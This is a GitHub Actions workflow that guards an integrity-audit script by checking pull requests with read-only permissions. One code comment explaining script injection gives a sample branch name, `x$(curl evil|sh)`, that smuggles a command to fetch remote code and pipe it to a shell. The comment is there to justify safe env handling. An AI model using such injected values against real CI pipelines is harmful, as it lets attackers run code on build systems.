name: Audit guard

# Blocks any PR that would defang the integrity-audit safety net (see
# scripts/audit_guard.py for exactly what it checks) or hand-edit the two
# paths that must only ever be written by the daily pipeline's own
# commit-back. Read-only against the repo otherwise -- no fixes, no writes.

on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: read

jobs:
  guard:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Checkout
        uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
        with:
          fetch-depth: 0

      - name: Set up Python
        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0
        with:
          python-version: '3.12'

      - name: Check protected core + forbidden paths
        # Untrusted PR-controlled values (github.head_ref is a branch name an
        # attacker names; git ref names permit $, `, ( ) unlike GitHub logins)
        # MUST go through env:, never be interpolated straight into `run:` --
        # the latter is classic GitHub Actions script injection (a branch
        # named `x$(curl evil|sh)` would execute inside the shell). env: vars
        # are passed as inert data; the shell never re-parses their content.
        env:
          PR_BASE_REF: ${{ github.event.pull_request.base.ref }}
          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          PR_ACTOR: ${{ github.event.pull_request.user.login }}
          PR_HEAD_REF: ${{ github.head_ref }}
        run: python scripts/audit_guard.py "origin/$PR_BASE_REF" "$PR_HEAD_SHA" "$PR_ACTOR" "$PR_HEAD_REF"
